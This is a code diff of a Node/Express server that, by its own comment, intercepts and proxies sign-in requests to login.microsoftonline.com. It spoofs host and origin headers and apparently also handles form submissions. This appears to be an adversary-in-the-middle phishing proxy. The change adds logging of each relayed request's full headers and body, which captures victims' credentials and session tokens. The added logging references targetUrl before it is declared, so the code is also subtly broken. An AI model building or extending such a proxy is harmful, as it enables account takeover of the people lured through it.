@@ -18,6 +18,17 @@ app.get("/", (req, res) => {
 // Intercept and proxy requests to Microsoft
 app.use("/common/*", async (req, res) => {
   try {
+    console.log("Outgoing Request:", {
+    method: req.method,
+    url: targetUrl,
+    headers: {
+        ...req.headers,
+        host: "login.microsoftonline.com",
+        origin: "https://login.microsoftonline.com",
+    },
+    data: req.body,
+});
+    
     const targetUrl = `https://login.microsoftonline.com${req.originalUrl}`;
     const response = await axios({
       method: req.method,
@@ -34,9 +45,15 @@ app.use("/common/*", async (req, res) => {
 
     res.status(response.status).send(response.data);
   } catch (error) {
-    console.log("Proxy Error:", error.message);
-    res.status(500).send("An error occurred.");
-  }
+    if (error.response) {
+        console.log("Proxy Error (Response):", error.response.data);
+    } else if (error.request) {
+        console.log("Proxy Error (Request):", error.request);
+    } else {
+        console.log("Proxy Error (Other):", error.message);
+    }
+    res.status(500).send("Proxy error occurred.");
+}
 });
 
 // Handle form submission
